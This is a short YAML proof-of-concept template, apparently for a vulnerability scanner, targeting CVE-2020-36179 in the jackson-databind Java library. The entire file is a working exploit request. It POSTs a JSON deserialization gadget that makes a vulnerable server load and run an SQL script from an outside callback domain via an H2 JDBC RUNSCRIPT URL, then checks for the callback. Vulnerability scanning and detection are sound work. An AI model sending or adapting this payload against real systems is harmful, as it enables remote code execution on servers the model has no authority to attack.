name: poc-yaml-fasterxml-jackson-databind-cve-2020-36179
transport: http
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
rules:
  r0:
    request:
      method: POST
      follow_redirects: false
      headers:
        Content-Type: application/json
      body: |-
        ["org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://{{reverseDomain}}/1.sql'"}]
    expression: response.status == 200 && reverse.wait(5)
expression: r0()
detail:
  author: Secur1ty0(https://github.com/Secur1ty0)
  links:
    - https://github.com/Al1ex/CVE-2020-36179
